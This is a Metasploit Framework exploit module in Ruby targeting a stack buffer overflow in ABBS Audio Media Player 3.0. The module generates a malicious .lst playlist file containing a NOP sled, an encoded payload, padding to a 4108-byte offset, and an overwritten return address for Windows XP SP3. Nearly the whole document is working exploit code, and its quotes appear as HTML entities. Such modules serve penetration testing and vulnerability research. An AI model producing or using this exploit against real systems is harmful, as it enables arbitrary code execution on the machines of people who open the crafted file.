# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = GreatRanking
 
    include Msf::Exploit::FILEFORMAT
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;ABBS Audio Media Player 3.0 (LST File) Stack Buffer Overflow&#039;,
            &#039;Description&#039;    => %q{
                    This module exploits a buffer overflow vulnerability
                    found in ABBS Audio Media Player 3.0.
                    The overflow occurs when an overly long string is passed
                    in the lst file.
            },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Author&#039;         => [
                          &#039;h1ch4m&#039;,     # Initial Discovery
                          &#039;James Fitts&#039; # Metasploit Module
                        ],
            &#039;Version&#039;        => &#039;$Revision: $&#039;,
            &#039;References&#039;     =>
                [
                    [ &#039;URL&#039;, &#039;http://www.exploit-db.com/exploits/16976&#039; ],
                ],
            &#039;DefaultOptions&#039; =>
                {
                    &#039;EXITFUNC&#039; => &#039;process&#039;,
                    &#039;DisablePayloadHandler&#039; => &#039;true&#039;,
                },
            &#039;Payload&#039;        =>
                {
                    &#039;BadChars&#039; => "\x00\x0a\x0d",
                },
            &#039;Platform&#039; => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                    [
                        &#039;Windows XP SP3 EN&#039;,
                        {
                            &#039;Ret&#039; => 0x0043551f, # call dword ptr ds:[eax] in amp.exe
                            &#039;Offset&#039; => 4108
                        }
                    ],
                ],
            &#039;Privileged&#039;     => false,
            &#039;DisclosureDate&#039; => &#039;Mar 14 2011&#039;,
            &#039;DefaultTarget&#039;  => 0))
 
            register_options(
                [
                    OptString.new(&#039;FILENAME&#039;, [ true, &#039;The file name.&#039;,  &#039;msf.lst&#039;]),
                ], self.class)
    end
 
    def exploit
         
        lst = make_nops(50)
        lst << payload.encoded
        lst << make_nops(target[&#039;Offset&#039;] - (50 + payload.encoded.length))
        lst << [target.ret].pack(&#039;V&#039;)
        lst << rand_text_alpha_upper(4)
 
        print_status("Creating &#039;#{datastore[&#039;FILENAME&#039;]}&#039; file ...")
 
        file_create(lst)
 
    end
 
end



